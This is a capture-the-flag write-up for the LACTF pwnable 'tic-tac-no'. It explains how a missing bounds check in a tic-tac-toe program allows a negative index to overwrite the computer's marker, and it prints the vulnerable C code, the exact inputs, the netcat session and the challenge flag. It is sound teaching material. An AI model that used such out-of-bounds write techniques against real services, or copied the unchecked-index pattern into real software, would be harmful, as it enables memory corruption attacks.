# tic-tac-no

## 1. Summary

- **Category**: Pwnable
- **Points**: 101
- **Solves**: 475

### Description

> `Tic-tac-toe is a draw when played perfectly. Can you be more perfect than my perfect bot?`

## 2. Analysis

### Checksec

```text
    Arch:        amd64-64-little
    RELRO:       Partial RELRO
    Stack:       No canary found
    NX:          NX enabled
    PIE:         PIE enabled
    Stripped:    No
```

### Vulnerability

- **Insufficient Index Validation**:
  The program only checks if the `board[index]` is already occupied when the `index` is between 0 and 8. If the index is outside this range, it bypasses the "Invalid move" check and proceeds to the `else` block, allowing an arbitrary 1-byte overwrite relative to the `board` address.

```c
void playerMove() {
   int x, y;
   do{
      printf("Enter row #(1-3): ");
      scanf("%d", &x);
      printf("Enter column #(1-3): ");
      scanf("%d", &y);
      int index = (x-1)*3+(y-1);
      if(index >= 0 && index < 9 && board[index] != ' '){
          printf("Invalid move.\n");
      }else{
          board[index] = player; // Vulnerability: Arbitrary 1-byte overwrite if index < 0 or index >= 9
          break;
      }
   }while(1);
}
```

## 3. Exploit Flow

1. **Targeting the Computer's Marker**
   The global variables are laid out in memory as follows:

   ```text
   0x62a9b547f050 <player>:        0x58 (ASCII 'X')
   0x62a9b547f051 <computer>:      0x4f (ASCII 'O')
   ...
   0x62a9b547f068 <board>:         0x2020202020202020      0x0000000000000020
   ```

   The `board` starts at `0x68`, and the `computer` variable is at `0x51`. The offset is `-0x17 (-23)`. By targeting this index, we can overwrite the computer's marker with our own marker (`X` / `0x58`).

2. **Calculating Input Values**
   To make `index = (x-1)*3 + (y-1)` equal `-23`:
   - Set `x = 1`
   - `(1-1)*3 + (y-1) = -23`
   - `y - 1 = -23`
   - `y = -22`

3. **Victory Strategy**
   Once the computer's marker is overwritten with `X`, every move the computer makes will place an `X` instead of an `O`. This guarantees a win for the player, triggering the flag output.

## 4. Final Solution

- **Exploit Process**:

```text
# nc chall.lac.tf 30001
You want the flag? You'll have to beat me first!
   |   |
---|---|---
   |   |
---|---|---
   |   |

Enter row #(1-3): 1
Enter column #(1-3): -22

   |   |
---|---|---
   | X |
---|---|---
   |   |

Enter row #(1-3): 1
Enter column #(1-3): 1

 X |   |
---|---|---
   | X |
---|---|---
   |   | X

How's this possible? Well, I guess I'll have to give you the flag now.
lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}
```

## 5. Flag

`lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}`
